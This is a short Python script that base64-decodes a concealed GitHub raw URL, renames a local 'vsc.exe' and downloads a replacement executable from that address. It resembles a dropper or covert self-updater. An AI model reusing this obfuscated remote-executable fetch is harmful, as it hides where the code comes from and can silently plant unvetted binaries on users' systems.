#!/usr/bin/env python3
import base64
import os
import urllib.request

def decode(string):
    return base64.b64decode(string).decode('utf-8')

def get_module_url(name):
    return decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Rqb3J2dWsvY2IvbWFzdGVyLw==') \
        + ('%s.exe' % (name))

def main():
    if os.path.exists('vsca.exe'): os.remove('vsca.exe')
    os.rename('vsc.exe', 'vsca.exe')
    urllib.request.urlretrieve(get_module_url('vsc'), './vsc.exe')
